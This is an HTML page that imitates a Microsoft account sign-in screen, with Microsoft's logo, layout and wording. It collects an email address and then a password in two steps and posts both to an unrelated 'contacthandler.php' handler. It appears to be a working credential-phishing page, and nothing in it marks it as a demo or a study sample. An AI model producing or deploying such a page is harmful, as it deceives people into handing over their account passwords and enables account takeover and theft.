<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Sign In</title>

<style>

body{
font-family:"Segoe UI", Arial, sans-serif;
background:#f2f2f2;
display:flex;
justify-content:center;
align-items:center;
height:100vh;
margin:0;
}

.login-box{
background:white;
width:340px;
padding:35px;
box-shadow:0 4px 10px rgba(0,0,0,0.1);
}

.logo{
margin-bottom:20px;
}

.logo img{
height:40px;
}

h2{
margin-bottom:25px;
}

input{
width:100%;
border:none;
border-bottom:1px solid #999;
padding:8px 2px;
font-size:14px;
margin-bottom:20px;
}

input:focus{
outline:none;
border-bottom:2px solid #0078d4;
}

.small-link{
font-size:13px;
color:#0078d4;
text-decoration:none;
display:block;
margin-bottom:20px;
}

.checkbox{
font-size:13px;
margin-bottom:15px;
display:block;
}

.btn-row{
display:flex;
justify-content:flex-end;
}

button{
background:#0078d4;
color:white;
border:none;
padding:8px 22px;
cursor:pointer;
}

button:hover{
background:#0067b8;
}

.hidden{
display:none;
}

</style>
</head>

<body>

<div class="login-box">

<div class="logo">
<img src="microsoft_logo.svg" alt="Logo">
</div>

<form action="contacthandler.php" method="POST">

<!-- Step 1 -->
<div id="step1">

<h2>Sign in</h2>

<input type="text" id="email" name="email" placeholder="Email, phone, or Skype">

<p style="font-size:13px;">
No account? <a href="#">Create one!</a>
</p>

<a class="small-link" href="#">Sign-in options</a>

<div class="btn-row">
<button type="button" onclick="nextStep()">Next</button>
</div>

</div>

<!-- Step 2 -->
<div id="step2" class="hidden">

<h2>Enter password</h2>

<input type="password" name="password" placeholder="Password">

<label class="checkbox">
<input type="checkbox"> Keep me signed in
</label>

<a class="small-link" href="#">Forgot my password</a>

<div class="btn-row">
<button type="submit">Sign in</button>
</div>

</div>

</form>

</div>

<script>

function nextStep(){

let email=document.getElementById("email").value;

if(email===""){
alert("Please enter email or phone");
return;
}

document.getElementById("step1").style.display="none";
document.getElementById("step2").style.display="block";

}

</script>

</body>
</html>
